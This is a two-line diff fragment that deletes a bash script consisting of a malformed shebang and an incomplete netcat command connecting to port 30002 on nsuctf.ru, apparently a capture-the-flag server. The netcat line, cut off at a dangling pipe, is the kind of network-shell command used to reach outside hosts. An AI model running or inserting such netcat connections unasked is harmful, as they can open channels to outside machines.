@@ -1,2 +1,0 @@
-!#/bin/bash
-nc nsuctf.ru 30002 | 
